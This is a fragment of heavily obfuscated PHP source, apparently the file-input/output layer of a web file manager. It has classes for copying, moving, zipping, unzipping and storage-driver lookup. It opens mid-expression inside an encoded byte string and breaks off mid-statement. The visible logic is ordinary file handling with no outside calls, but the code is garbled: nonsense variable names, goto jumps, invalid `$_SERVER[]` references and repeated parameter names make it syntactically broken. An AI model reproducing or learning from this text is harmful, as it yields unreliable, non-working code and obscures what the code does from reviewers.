y/0Z..N`')."\341\263\150\342\302\352\10\305\331\123\243\35\200\342\255\340\212\273\355\240\266\130\53\212\46\336\145\53\212\74\210\115\334\200\25\341\265\64\246\10\167\345\247\372\205\174\234"."\307\25\261\61\300\145\302\65\132\364\72\123\44\132\64\130\50\156\322\20\52\72\365\15\253\255\201\15\56\42\206\332\35\1\345\214\77\261\54\130\350\216\261\260\364\134\246"."\x2f\xa3\xb1\x65\x22\xce\xad\xc3\xa0\xf1\x29\x7b\x94\x98\x55\x57\x50\x9a\x95\x34\x33\x39\xc1\x6e\xb4\xa8\xc1\xb0\x3\xaa\xd2\x85\x4a\x6b\x8a\x3e\x14\x23\x5a\x5a\x63\xad\x45\x33\xd5\x98\x60"."\xef\xc4\xad\x4e\x59\x37\x55\x2e\xc6\xa7\x84\xbd\x36\xdb\x36\x17\x57\xec\x2d\x47\xde\x45\x36\x82\x10\x88\x88\x6b\x7c\x3b\xd9\x62\x77\x8e\xd7\x7f\xb2\x8f\x8e\x4f\xd3\xbc\xf0\xf0\x95\x1d\xa1"."\x40\xf5\xca\x81\xd7\x4b\x1c\x1d\xd6\x74\xd3\x1\xe3\x22\x5a\x16\xfd\xd6\x6b\xa6\xc9\xf\x89\xb1\xba\x8c\x84\x3c\xb8\xe8\x39\x4\x5b\x7\xf0\xc5\xcf\x4b\x20\x16\xd1\x16\x3e\x22\x47\xc4\x36".strrev('][{y]wxmnȔ'."\0".'\'l55hXوXhz9\'')."\x90\xe3\x32\x8\xa1\x37\xd1\x72\x3\xdd\x28\x36\xdc\x38\xc6\x4d\x9c\xe3\x3a\x51\x19\xe4\xb1\xd\x57\x6f\x36\x61\xc9\x8e\x9f\xf\x60\x16\x8b\xbf\x55\x2\xd9\x86\xe4\x45\x60\xa7\x99\x68\x7"."\x9\xba\x8f\xf5\xcd\xf5\x87\x23\xe1\x82\xa8\x36\x4f\x38\x3c\x27\x18\x6a\xc0\x3e\x36\xb\xa2\x51\x2e\xc1\x48\xa6\x20\xaa\xad\x39\xd8\xba\xab\x38\x5f\x8b\xc7\x1f\x28\x88\x83\x46\x33\xad\x51"."\xee\x3\x8\x47\xf9\xdb\x50\x2b\x3d\x81\x40\x70\xce\xae\x5a\xe1\xf7\xce\xe4\x2d\x41\x87\xa6\x7c\x77\x3b\x9b\xd4\xe8\xa6\x35\xdd\xfd\xf\xcb\x29\xaa\x4b\xb\x57\xe1\x94\x34\x77\x6\xc5\xf3".base64_decode('WLcIxHE1qJ809mH1RG+zX6MESwqCBi+tpOxQlkChz1E2uZmwjDok2snxY2GX5fg=')."\130\200\243\311\202\130\214\100\204\342\352\212\0\25\105\61\46\156\225\26\156\335\243\130\216\21\330\322\223\64\142\142\325\253\165\13\133\363\130\167\41\367\323\10\216\5\53".base64_decode('J/xNov8HBCRTxr6hAAA=')._kodDe('MQ==')."".base64_decode('')."", 10, -8))); goto bޑ; dî: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($D, $c퇗) { goto F̎; cǆģ: Hook::trigger($Aͩ[1061] . $D . $Aͩ[1064], $aĻ, $D); return $D; goto Dԗ׾; F̎: $Aͩ =& $_SERVER[]; $aĻ = $c퇗; $GLOBALS[$Aͩ[1060]] = $Aͩ[1061] . $D; goto Cإ; Cإ: Hook::trigger($Aͩ[1061] . $D . $Aͩ[1062], $aĻ); $d = self::driverMake($c퇗[0]); if (method_exists($d, $D)) { $D = @call_user_func_array(array($d, $D), $c퇗); } else { if (method_exists($d, $Aͩ[1063])) { $D = @call_user_func_array(array($d, $D), $c퇗); } else { if (method_exists(self, $D)) { $D = @call_user_func_array(array(self, $D), $c퇗); } else { $D = call_user_func_array(array(parent, $D), $c퇗); } } } goto cǆģ; Dԗ׾: } public static function init($fॄ) { return self::driverMake($fॄ); } public static function copy($fϭ, $A, $E = false, $A = false) { return self::copyMoveStart($fϭ, $A, $E, $_SERVER[][543], $A); } public static function move($D, $F, $AѦ = false, $dԌ = false) { return self::copyMoveStart($D, $F, $AѦ, $_SERVER[][545], $dԌ); } private static function copyMoveStart($C݂֑, $Bʠ, $cԛ, $e놾, $dļ) { $aȬ =& $_SERVER[]; $d = array($C݂֑, $Bʠ, $cԛ, $dļ); Hook::trigger($aȬ[1061] . $e놾 . $aȬ[1062], $d); $Bў = self::copyMove($C݂֑, $Bʠ, $cԛ, $e놾, $dļ); Hook::trigger($aȬ[1061] . $e놾 . $aȬ[1064], $d, $Bў); return $Bў; } public static function saveFile($F옛, $bɲ, $C = true) { goto A; eɤ: if ($eԻ->pathParse[$cʡ[1065]]) { $eԻ = self::driverMake($eԻ->pathParse[$cʡ[1065]]); } $Eʦ = $BÔ->pathFather($bɲ); $c = !0; goto cՋϯ; C: $BÔ = self::driverMake($bɲ); $c莣҃ = !1; if ($BÔ->pathParse[$cʡ[1065]]) { $c莣҃ = $BÔ; $BÔ = self::driverMake($BÔ->pathParse[$cʡ[1065]]); } goto eɤ; A: $cʡ =& $_SERVER[]; $Bڥڡ = self::info($bɲ); $eԻ = self::driverMake($F옛); goto C; cՋϯ: if (!$C && self::driverIsSame($eԻ, $BÔ)) { $c = !1; } $BȻ = self::copyFile($eԻ, $F옛, $BÔ, $Eʦ, $Bڥڡ[$cʡ[28]], $c); if ($c莣҃) { $BȻ = $c莣҃->getPathOuter($BȻ); } goto E̊; E̊: return $BȻ; goto b꧰į; b꧰į: } private static function copyMove($c͍ڭ, $cΤј, $FΧà, $eձ, $c = false) { goto eϕ; D: $Dڶ = self::driverMake($c͍ڭ); $FԘ = self::driverMake($cΤј); $A = $eձ == $Aһˆ[545]; goto E; Bꦾ: if ($dɔ) { if ($eձ == $Aһˆ[545] && !method_exists($FԘ, $Aһˆ[1066]) && trim($cΤј, $Aһˆ[8]) == trim($FԘ->pathFather($c͍ڭ), $Aһˆ[8])) { if ($Dڶ->pathThis($c͍ڭ) != $c && !$Dڶ->isTypeObject()) { return $Dڶ->rename($c͍ڭ, $c); } return $FԘ->getPathOuter($c͍ڭ); } if (method_exists($FԘ, $eձ)) { return $FԘ->{$eձ}($c͍ڭ, $cΤј, $FΧà); } } $A = $Dڶ->isFile($c͍ڭ); if (!$A && $FԘ->getType() == $Aһˆ[735] && $Dڶ->getType() == $Aһˆ[106]) { $D׬汕 = $FԘ->copyFolderFromIO($Dڶ, $c͍ڭ, $cΤј, $FΧà, $A, $c); } else { $D׬汕 = self::copyPath($Dڶ, $c͍ڭ, $FԘ, $cΤј, $FΧà, $A, $A, $c); } goto Fǋ; Fǋ: if ($D׬汕 && $A) { $Dڶ->remove($c͍ڭ); } if ($cυ) { $D׬汕 = $cυ->getPathOuter($D׬汕); } return $D׬汕; goto d֛; eϕ: $Aһˆ =& $_SERVER[]; if (!$c͍ڭ || $c͍ڭ == $Aһˆ[8] || !$cΤј) { return !1; } ignore_timeout(); goto D; E٤: self::check($Dڶ, $c͍ڭ, $FԘ, $cΤј); Hook::trigger($Aһˆ[73], $Dڶ, $c͍ڭ, $FԘ, $cΤј); $dɔ = self::driverIsSame($Dڶ, $FԘ); goto Bꦾ; E: $cυ = !1; if ($FԘ->pathParse[$Aһˆ[1065]]) { $cυ = $FԘ; $FԘ = self::driverMake($FԘ->pathParse[$Aһˆ[1065]]); } if ($Dڶ->pathParse[$Aһˆ[1065]]) { $Dڶ = self::driverMake($Dڶ->pathParse[$Aһˆ[1065]]); } goto E٤; d֛: } private static function check($aܐ, $Fκ, $Eߧω, &$Cù) { $bⰿ =& $_SERVER[]; if (self::driverIsSame($aܐ, $Eߧω) && $aܐ->isFolder($Fκ) && $aܐ->isParentOf($Fκ, $Cù)) { show_json(LNG($bⰿ[1067]), !1); } if (!$aܐ->exist($Fκ)) { show_json(LNG($bⰿ[105]), !1); } } private static function copyPath($bۇꃫ, $e, $D䍿ԡы, $Fθ, $CȌ¥̤, $B, $c, $a吔 = false) { goto C꣖; Aךˡ: $fˊ = is_array($fˊ) ? $fˊ : array($bѡ[74] => array(), $bѡ[75] => array()); $b = array_merge($fˊ[$bѡ[74]], $fˊ[$bѡ[75]]); foreach ($b as $Eӕ) { $D = $Eӕ[$bѡ[29]] == $bѡ[193]; $e = $bۇꃫ->getPathInner($Eӕ[$bѡ[76]]); $AȾ = self::copyPath($bۇꃫ, $e, $D䍿ԡы, $Fθ, $CȌ¥̤, $B, $D); if (!$AȾ) { IO::errorTips($bѡ[1068] . $e . $bѡ[67] . $Fθ); } } goto a凍; a凍: self::copyMoveKeepInfo($bۇꃫ, $e, $Eѯ); return $Eѯ; goto d; C꣖: $bѡ =& $_SERVER[]; $a = empty($a吔) && $a吔 !== $bѡ[191] ? $bۇꃫ->pathThis($e) : $a吔; if ($CȌ¥̤) { $Fù = $D䍿ԡы->fileNameExist($Fθ, $a); $a = $D䍿ԡы->fileNameAuto($Fθ, $a, $CȌ¥̤, !$c); $CȌ¥̤ = $Fù ? $CȌ¥̤ : !1; } goto c; c: if ($c) { return self::copyFile($bۇꃫ, $e, $D䍿ԡы, $Fθ, $a, $B); } if ($CȌ¥̤ == REPEAT_RENAME_FOLDER) { $CȌ¥̤ = !1; } $D蠻 = rtrim($Fθ, $bѡ[8]) . $bѡ[8] . $a; goto Aݢ; Aݢ: $Eѯ = $D䍿ԡы->mkdir($D䍿ԡы->getPath($D蠻)); $Fθ = $D䍿ԡы->getPathInner($Eѯ); $fˊ = $bۇꃫ->listPath($e, !0); goto Aךˡ; d: } private static function copyFile($Aދ, $B, $e㰄, $d֑, $B, $D) { goto d঎; Aޯ: Hook::trigger($BȦ[1070], $Aދ, $B, $e㰄, $d֑, $B, $dڃ); if (self::driverIsSame($Aދ, $e㰄)) { if ($D) { $bʦ = $e㰄->moveFile($B, $d֑); } else { $bʦ = $e㰄->copyFile($B, $d֑); } Hook::trigger($BȦ[1071], $Aދ, $B, $e㰄, $d֑, $B, $bʦ); self::copyMoveKeepInfo($Aދ, $B, $bʦ); return $bʦ; } $a = TEMP_FILES; goto A̸; A̸: if ($GLOBALS[$BȦ[6]][$BȦ[88]][$BȦ[779]]) { $a = $GLOBALS[$BȦ[6]][$BȦ[88]][$BȦ[779]]; } $D = !0; $bﰵ = $a; goto e; eᇱ: self::remove($c); Hook::trigger($BȦ[1071], $Aދ, $B, $e㰄, $d֑, $B, $bʦ); self::copyMoveKeepInfo($Aދ, $B, $bʦ); goto F՗; e: mk_dir($bﰵ); $c = $bﰵ . $dڃ; $c = $c; goto C; F՗: return $bʦ; goto FĹ; C: $c = $Aދ->download($B, $c); $c = $Aދ->iconvApp($c); $bʦ = $e㰄->upload($d֑, $c, $D); goto eᇱ; d঎: $BȦ =& $_SERVER[]; $d֑ = $e㰄->getPath(rtrim($d֑, $BȦ[8]) . $BȦ[8] . $B); $dڃ = $BȦ[1069] . time() . rand_string(5); goto Aޯ; FĹ: } private static function copyMoveKeepInfo($D, $bɷأ, $fӂֿ) { if (!$fӂֿ) { return; } $B־蒖 = $D->info($bɷأ); if (!is_array($B־蒖)) { return; } IO::setModifyTime($fӂֿ, $B־蒖[$_SERVER[][84]]); } public static function pathFather($eɫ) { $dѤ = IO::init($eɫ); $E݂ = $dѤ->pathFather($dѤ->path); return $dѤ->getPathOuter($E݂); } public static function fileOut($AӺ, $Fڐ = false, $e = false, $a = '') { $eҝ = self::driverMake($AӺ); if ($eҝ->isFileOutServer()) { return $eҝ->fileOutServer($AӺ, $Fڐ, $e, $a); } return $eҝ->fileOut($AӺ, $Fڐ, $e, $a); } public static function fileOutImage($b̖, $Dĝ = 250) { $E = array(250, 600, 1200, 2000, 3000, 5000); for ($d׾Ű = 0; $d׾Ű < count($E); $d׾Ű++) { if ($d׾Ű == 0 && $Dĝ <= $E[$d׾Ű]) { $Dĝ = $E[$d׾Ű]; break; } else { if ($Dĝ > $E[$d׾Ű - 1] && $Dĝ <= $E[$d׾Ű]) { $Dĝ = $E[$d׾Ű]; break; } else { if ($d׾Ű == count($E) - 1 && $Dĝ > $E[$d׾Ű]) { $Dĝ = $E[$d׾Ű]; break; } } } } $f = self::driverMake($b̖); if ($f->isFileOutServer()) { return $f->fileOutImageServer($b̖, $Dĝ); } return $f->fileOutImage($b̖, $Dĝ); } private static function driverIsSame($dձ, $e螎) { goto aɮ; A򘞽: if ($Ē != $D) { return !1; } if ($Ē == $Dۘ[735]) { return !0; } if ($Ē == $Dۘ[106]) { return !0; } goto DƉ; aɮ: $Dۘ =& $_SERVER[]; $Ē = $dձ->getType(); $D = $e螎->getType(); goto A򘞽; DƉ: if ($dձ->pathDriver == $e螎->pathDriver) { return !0; } return !1; goto f鷩͌; f鷩͌: } public static function copyUpdate($Dݹ, $AƩ) { goto A⪾; b: $Cʸ = array(); foreach ($B񻊋 as $bԛ㪯 => $b뵯ʅ) { if (isset($b[$bԛ㪯])) { if ($b뵯ʅ[$C۾ј[77]] == 1) { continue; } if ($b[$bԛ㪯][$C۾ј[78]] == $b뵯ʅ[$C۾ј[78]]) { continue; } } if ($b뵯ʅ[$C۾ј[77]] == 1) { $Cʸ[] = $AƩ . $C۾ј[8] . $bԛ㪯; continue; } $A͐ = strstr(trim($bԛ㪯, $C۾ј[8]), $C۾ј[8]) ? get_path_father($bԛ㪯) : $C۾ј[33]; $dš[] = array($C۾ј[1072] => $b뵯ʅ[$C۾ј[76]], $C۾ј[1073] => rtrim($AƩ, $C۾ј[8]) . $C۾ј[8] . $A͐, $C۾ј[1074] => $b뵯ʅ); } $Fב = array($C۾ј[193] => $dš, $C۾ј[77] => $Cʸ); goto D; D: Hook::trigger($C۾ј[1075], $Dݹ, $AƩ, $Fב); foreach ($Cʸ as $b뵯ʅ) { IO::mkdir($b뵯ʅ); } foreach ($dš as $b뵯ʅ) { IO::copy($b뵯ʅ[$C۾ј[1072]], $b뵯ʅ[$C۾ј[1073]], REPEAT_REPLACE); } goto bݺ; bՒ: $B񻊋 = self::_listAll($Dݹ); $b = self::_listAll($AƩ); $dš = array(); goto b; A⪾: $C۾ј =& $_SERVER[]; if (!IO::exist($Dݹ)) { return !1; } if (!IO::exist($AƩ)) { IO::mkdir($AƩ); } goto bՒ; bݺ: } private static function _listAll($a奦) { $EȽٵ =& $_SERVER[]; $a奦 = KodIO::clear($a奦); $a = IO::listAll($a奦); foreach ($a as &$Dź) { $DȔ = substr($Dź[$EȽٵ[76]], strlen($a奦)); $Dź[$EȽٵ[1076]] = trim($DȔ, $EȽٵ[8]); } unset($Dź); return array_to_keyvalue($a, $EȽٵ[1076]); } public static function fileSubstr($AȤ, $e甌, $fٶ = false) { goto Bϐ; Bϐ: $E駐 =& $_SERVER[]; $D௉ = self::driverMake($AȤ); $d񽄚 = $D௉->size($AȤ); goto BԬ; eϸ얆: if ($fٶ <= 0) { return $E駐[33]; } if ($e甌 < 0 || $e甌 >= $d񽄚 || $fٶ > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\x65\122\145\141\144\40\x65\162\x72\157\162\41\40\x73\x74\141\162\x74\75{$e甌}\73\154\x65\156\147\x74\x68\x3d{$fٶ}\73\40\x73\151\x7a\x65\75{$d񽄚}\x3b"); } $b = $D௉->fileSubstr($AȤ, $e甌, $fٶ); goto fĄ; fĄ: if (!$b && $fٶ && isset($GLOBALS[$E駐[1079]])) { throw new Exception($GLOBALS[$E駐[1079]][$E駐[1080]]); } return $b; goto E; Aߟ: if ($fٶ === !1) { $fٶ = $d񽄚 - $e甌; } if ($e甌 + $fٶ > $d񽄚) { $fٶ = $d񽄚 - $e甌; } if (!$d񽄚 && $D௉->getType() == $E駐[106] && !$D௉->exist($AȤ)) { throw new Exception($E駐[1077] . LNG($E駐[1078]) . $E駐[943] . get_path_this($AȤ) . $E駐[33]); } goto eϸ얆; BԬ: $b = $e甌; $eی = $fٶ; if ($e甌 < 0) { $e甌 = $d񽄚 + $e甌; } goto Aߟ; E: } private static function driverMake(&$CӠ) { goto A; f۳: return $fއ; goto B; A: $f =& $_SERVER[]; $fʫ = KodIO::parse($CӠ); if (!self::$driverListSystem) { $d = Model($f[744])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($d, $f[395]); } goto E錱; E錱: if ($fʫ[$f[29]] == KodIO::KOD_IO && !self::$driverListSystem[$fʫ[$f[395]]]) { return !1; } $CӠ = $fʫ[$f[1081]]; $fއ = self::driverGet($fʫ, $CӠ); goto f۳; B: } private static function driverGet($aݸ, &$A⦭) { goto E; DϤ: $AЩ->path = $A⦭; return $AЩ; goto E; F: switch ($aݸ[$b[29]]) { case KodIO::KOD_IO: $Dݼ = self::$driverListSystem[$c߶]; break; case KodIO::KOD_SOURCE: $A⦭ = $c߶ . $A⦭; $Dݼ = array($b[1083] => $b[1084], $b[6] => $aݸ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Bږō = $GLOBALS[$b[1085]]; self::$driverListUser = array_to_keyvalue($Bږō, $b[395]); } $Dݼ = self::$driverListUser[$c߶]; break; case KodIO::KOD_SHARE_LINK: $Dݼ = array($b[1083] => $b[1086], $b[6] => $aݸ); $Aё԰ٳ = Action($b[1087])->sharePathInfo($aݸ[$b[76]]); $A⦭ = $Aё԰ٳ[$b[397]]; if (!$Aё԰ٳ[$b[397]]) { $c = Model($b[589])->getInfo($Aё԰ٳ[$b[482]]); $A⦭ = KodIO::clear($c[$b[1088]] . $aݸ[$b[1081]]); $aݸ[$b[480]] = $c; $aݸ[$b[1065]] = $A⦭; $Dݼ = array($b[1083] => $b[1089], $b[6] => $aݸ); } break; case KodIO::KOD_SHARE_ITEM: $Dݼ = array($b[1083] => $b[1090], $b[6] => $aݸ); $c = Model($b[589])->getInfo($aݸ[$b[395]]); if ($c[$b[397]] == $b[191]) { $A⦭ = KodIO::clear($c[$b[1088]] . $aݸ[$b[1081]]); $aݸ[$b[480]] = $c; $aݸ[$b[1065]] = $A⦭; $Dݼ = array($b[1083] => $b[1091], $b[6] => $aݸ); } else { if (!$A⦭) { $A⦭ = $c[$b[397]]; } } break; default: $A⦭ = $aݸ[$b[76]]; $Dݼ = array($b[1083] => $b[1092]); break; } $Bɏّ = $aݸ[$b[76]]; if (!isset(self::$driverCache[$Bɏّ])) { $Fż = strtolower($Dݼ[$b[94]]); $d̍͵ = $GLOBALS[$b[6]][$b[88]][$b[810]]; $f = $b[72] . (isset($d̍͵[$Fż]) ? $d̍͵[$Fż] : ucfirst($Fż)); if (!class_exists($f)) { show_json("{$f}\40\156\x6f\164\40\145\170\x69\163\x74\163\41", !1); } $b繳׾ = isset($Dݼ[$b[6]]) ? $Dݼ[$b[6]] : !1; self::$driverCache[$Bɏّ] = new $f($b繳׾); } goto a; E: $b =& $_SERVER[]; $Eӂ҈ = $aݸ[$b[1082]]; $c߶ = $aݸ[$b[395]]; goto F; a: $AЩ = self::$driverCache[$Bɏّ]; $AЩ->pathDriver = $Eӂ҈; $AЩ->pathBase = $b[33]; goto Eپ; Eپ: if (isset($Dݼ[$b[6]][$b[1093]])) { $AЩ->pathBase = rtrim($Dݼ[$b[6]][$b[1093]], $b[8]) . $b[8]; $A⦭ = $AЩ->pathBase . ltrim($A⦭, $b[8]); } $A⦭ = $AЩ->getPath($A⦭); if (isset($aݸ[$b[1065]])) { $A⦭ = $aݸ[$b[1065]]; } goto DϤ; E: } public static function errorTips($f = false) { goto c; c: $A =& $_SERVER[]; static $b޺ = array(); $EÞޕ = 1000; goto E놮; E놮: if ($f === -1) { return $b޺ ? $b޺[count($b޺) - 1] : $A[33]; } if ($f === !1) { return implode($A[229], $b޺); } if (count($b޺) >= $EÞޕ) { $b޺ = array_slice($b޺, $EÞޕ * 0.5, $EÞޕ); } goto C; C: $b޺[] = $f; write_log($A[160] . ACTION . $A[1094] . $f, $A[1095]); goto fд; fд: } public static function getLastError($Bޕ҂ = '') { $Eҫ = self::errorTips(-1); return $Eҫ ? $Eҫ : $Bޕ҂; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $e; if (!$e) { $F눉 = IO::init($_SERVER[][8]); } return $F눉; } private static function iconvSystem($C) { return self::local()->iconvSystem($C); } private static function iconvApp($aۨ) { return self::local()->iconvApp($aۨ); } public static function zip($A｢, $fϳ = "\x7a\151\160", $d֭ۜ = '', $fا = REPEAT_RENAME) { goto aΪ; C푦: if ($d֭ۜ || !$e) { if ($e && strstr($e, TEMP_FILES)) { $DՇ = $dÞ = array(); recursion_dir($Aٚ, $DՇ, $dÞ, 0); foreach ($DՇ as $dۑ) { del_dir($dۑ); } foreach ($dÞ as $A) { if ($A == $AΟ) { continue; } del_file($A); } } return $B; } $cǝދ = self::pathFather($D[$bä[76]]); $D = self::move($B, $cǝދ, $fا); goto cޮ; Cݳ: foreach ($dÞ as $d銮 => $a) { $dÞ[$d銮] = self::iconvSystem($a); } KodArchive::create($AΟ, $dÞ); if (!IO::exist($B)) { if ($e) { del_dir($e); } show_json(LNG($bä[1098]), !1); } goto C푦; cޮ: if (!$D) { del_dir($e); show_json(LNG($bä[1098]), !1); } del_dir($e); return $D; goto F˄; CЏ: $B = $Aٚ . $Fیȥ . $bä[95] . $fϳ; $B = get_filename_auto($B, $bä[33], $fا); $AΟ = self::iconvSystem($B); goto Cݳ; a: if (count($dÞ) > 1) { $cǯ = IO::info(IO::pathFather($D[$bä[76]])); $Fیȥ = $cǯ[$bä[28]]; } $Aٚ = $e; if (!$Aٚ) { $Aٚ = get_path_father($D[$bä[76]]); if (!$d֭ۜ && $Eؑ->getType() == $bä[106]) { $Aٚ = get_path_father($Eؑ->path); } $f = IO::info($Aٚ); if (!$f[$bä[196]]) { show_json(LNG($bä[1097]), !1); } } goto CЏ; BƠ: $e = !1; if (!$d֭ۜ && $Eؑ->getType() == $bä[106]) { $dÞ = self::zipFileList($A｢); } else { $e = $d֭ۜ ? $d֭ۜ : TEMP_FILES . $bä[1096] . time() . rand_string(8) . $bä[8]; mk_dir($e); $dÞ = self::zipFileList($A｢, $e); } $Fیȥ = $D[$bä[28]]; goto a; aΪ: $bä =& $_SERVER[]; $Eؑ = self::init($A｢[0][$bä[76]]); $D = self::info($A｢[0][$bä[76]]); goto BƠ; F˄: } public static function unzip($aׇ, $fܜ = "\x72\145\160\x6c\141\x63\x65") { goto Bъ; b˶: return !0; goto C; AӤ: if (!@file_exists(self::iconvSystem($BԦ))) { $D = self::localFilePath($C߆, $A); $BԦ = $D ? $D : parent::download($C߆, $BԦ); } $BԦ = self::iconvSystem($BԦ); $d = isset($aׇ[$eÈ[1101]]) ? $aׇ[$eÈ[1101]] : $eÈ[1102]; goto bх; bх: $E = KodArchive::extract($BԦ, $Dѱů . $eÈ[8], $d); self::archiveExt(); if (!$E[$eÈ[1103]]) { show_json($eÈ[1104] . $E[$eÈ[1105]], !1); } goto B஌; Aͯ: mk_dir($Dѱů); $A = self::fileExt($f); $BԦ = $Dѱů . $eÈ[95] . $A; goto AӤ; d: $a = self::tmpFileName($f); $Dѱů = TEMP_FILES . $a; del_dir($Dѱů); goto Aͯ; FĔ: foreach ($Aݏ as $A) { $A = self::iconvApp($A); self::move($A, $c瞄׭, $fܜ); } del_dir($Dѱů); if (!$D) { del_file($BԦ); } goto b˶; B஌: Hook::trigger($eÈ[1106], $Dѱů); recursion_dir($Dѱů, $f, $EӚ, 0); $Aݏ = array_merge($f, $EӚ); goto FĔ; dߘ: if (!($f = parent::info($C߆))) { show_json(LNG($eÈ[1100]), !1); } if (!($Bװ = parent::infoFull($c瞄׭))) { $c瞄׭ = parent::mkdir($c瞄׭); $Bװ = array($eÈ[76] => $c瞄׭); } else { if (isset($Bװ[$eÈ[397]]) && trim($Bװ[$eÈ[76]], $eÈ[8]) != trim($c瞄׭, $eÈ[8])) { $a = KodIO::make($Bװ[$eÈ[492]]); $fӡ = parent::fileNameAuto($a, $Bװ[$eÈ[28]], REPEAT_RENAME_FOLDER, !0); $c瞄׭ = parent::mkdir($a . $fӡ); $Bװ = array($eÈ[76] => $c瞄׭); } } $c瞄׭ = $Bװ[$eÈ[76]]; goto d; Bъ: $eÈ =& $_SERVER[]; $C߆ = $aׇ[$eÈ[76]]; $c瞄׭ = $aׇ[$eÈ[1099]]; goto dߘ; C: } public static function unzipList($Dпڹ) { goto c; DúѪ: self::archiveExt(); del_dir($CóԺ); if (!$aΗ؉[$dփ[1103]]) { show_json($aΗ؉[$dփ[1105]], !1); } goto A; c: $dփ =& $_SERVER[]; $a = $Dпڹ[$dփ[76]]; $B = isset($Dпڹ[$dփ[1107]]) ? $Dпڹ[$dփ[1107]] : -1; goto c텉; Cձ: if (!is_dir($CóԺ)) { mk_dir($CóԺ); } $aϑ = $CóԺ . $dփ[8] . $a; if (!@file_exists(self::iconvSystem($aϑ))) { if (isset($eɹ)) { url_request($a, $dփ[1110], $aϑ); } else { $e͖ = self::localFilePath($a, $bٸ); $aϑ = $e͖ ? $e͖ : self::download($a, $aϑ); } } goto eч; AÆ: return $aΗ؉[$dփ[1105]]; goto f²; A: $f퇎 = json_encode($aΗ؉[$dփ[1105]]); self::setContent($FѹŃ, $f퇎); if (count($aΗ؉[$dփ[1105]]) >= $d) { show_json(sprintf(LNG($dփ[1109]), count($aΗ؉[$dփ[1105]])), !1); } goto AÆ; dҢ: $a泌 = self::info($BҖ); $bٸ = self::fileExt($a泌); $FԐ = self::tmpFileName($a泌); goto D̃; D̃: if (isset($eɹ)) { $E = array($eɹ[$dփ[76]], $eɹ[$dփ[1107]], $eɹ[$dփ[28]]); $a = md5(implode($dփ[71], $E)) . $dփ[95] . get_path_ext($eɹ[$dփ[28]]); } else { $E = array($a泌[$dփ[28]], $a泌[$dփ[76]], $a泌[$dփ[78]]); $a = md5(implode($dփ[71], $E)) . $dփ[95] . $bٸ; } if ($B == -1) { $FѹŃ = IO_PATH_SYSTEM_TEMP . "\172\151\160\126\151\145\x77\x2f{$FԐ}\x2f{$a}\56\x6c\x6f\147"; $EŖ = self::infoFull($FѹŃ); if ($EŖ) { $FѹŃ = $EŖ[$dփ[76]]; $C蕂 = self::getContent($FѹŃ); if ($C蕂) { $f퇎 = json_decode($C蕂, !0); if (count($f퇎) >= $d) { show_json(sprintf(LNG($dփ[1109]), count($f퇎)), !1); } return $f퇎; } } else { $FѹŃ = self::mkfile($FѹŃ); } } $CóԺ = TEMP_FILES . $FԐ; goto Cձ; eч: $aϑ = self::iconvSystem($aϑ); if ($B >= 0) { $Cȼ = isset($Dпڹ[$dփ[1111]]) ? $Dпڹ[$dփ[1111]] : !1; $Dޒ = isset($Dпڹ[$dփ[28]]) ? $Dпڹ[$dփ[28]] : $dփ[33]; KodArchive::filePreview($aϑ, $B, $Cȼ, $Dޒ); self::archiveExt(); die; } $aΗ؉ = KodArchive::listContent($aϑ); goto DúѪ; c텉: $d = 50000; if (request_url_safe($a)) { $eɹ = parse_url_query($a); if (!isset($eɹ[$dփ[76]])) { show_json($dփ[1108], !1); } } $BҖ = isset($eɹ) ? $eɹ[$dփ[76]] : $a; goto dҢ; f²: } private static function fileExt($dśƅƑ) { $F =& $_SERVER[]; $dڱ = $dśƅƑ[$F[168]]; if ($dڱ == $F[1112]) { $Fڷ = $F[1113]; if (substr($dśƅƑ[$F[28]], -strlen($Fڷ)) == $Fڷ) { $dڱ = $F[1114]; } } self::archiveExt($dڱ); return $dڱ; } private static function zipFileList($a, $E = false) { $Dʅ =& $_SERVER[]; $Eэ = array(); foreach ($a as $cܙ) { $d = $cܙ[$Dʅ[76]]; if ($E) { $d = self::copy($cܙ[$Dʅ[76]], $E, $Dʅ[802]); } else { $e = self::init($cܙ[$Dʅ[76]]); if ($e->getType() == $Dʅ[106]) { $d = $e->path; } } if ($d && self::local()->exist($d)) { $Eэ[$cܙ[$Dʅ[76]]] = $d; } } if (!empty($Eэ)) { return array_values($Eэ); } show_json(LNG($Dʅ[1078]), !1); } public static function tmpFileName($F) { $f؟뼉 =& $_SERVER[]; $a֮ = array($F[$f؟뼉[28]], $F[$f؟뼉[76]], $F[$f؟뼉[78]], $F[$f؟뼉[515]]); return md5(implode($f؟뼉[71], $a֮)); } private static function localFilePath($bț, $d⎒) { goto fӝ; E̎: if ($F[$A􏪘[29]] == KodIO::KOD_SOURCE) { $aՈ = Model($A􏪘[809])->fileInfoGet(KodIO::sourceID($bț)); if (!$aՈ[$A􏪘[76]]) { show_json($A􏪘[1117], !1); } $bț = $aՈ[$A􏪘[76]]; } $BǉĻ = self::init($bț); $eΡǪ = $BǉĻ->getType(); goto f; f: if ($eΡǪ == $A􏪘[106] || $eΡǪ == $A􏪘[1118]) { if (!$BǉĻ->exist($BǉĻ->path)) { show_json(LNG($A􏪘[105]), !1); } return $BǉĻ->path; } return !1; goto b̙; fӝ: $A􏪘 =& $_SERVER[]; if ($d⎒ == $A􏪘[1115] && strtoupper(substr(PHP_OS, 0, 3)) == $A􏪘[1116]) { return !1; } $F = KodIO::parse($bț); goto E̎; b̙: } private static function archiveExt($cη = '') { $GLOBALS[$_SERVER[][1119]] = $cη; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto CΎ܃; CΎ܃: $D֞ =& $_SERVER[]; $Bｲ = $GLOBALS[$D֞[6]][$D֞[88]]; if ($Bｲ[$D֞[1120]] != 1) { return; } goto Ȩ; Ȩ: if ($Bｲ[$D֞[1121]] <= 0) { return; } if (isset($_REQUEST[$D֞[1122]]) && $_REQUEST[$D֞[1122]] == $D֞[87]) { return; } Hook::bind($D֞[1123], $D֞[1124]); goto Ḋ; Ḋ: Hook::bind($D֞[1125], $D֞[1126]); Hook::bind($D֞[1127], $D֞[1128]); Hook::bind($D֞[1129], $D֞[1130]); goto Eī; Eī: Hook::bind($D֞[1131], $D֞[1132]); Hook::bind($D֞[1133], $D֞[1134]); goto aڂ; aڂ: } public static function eventBeforeUpload($bʝ) { if ($bʝ[3] && 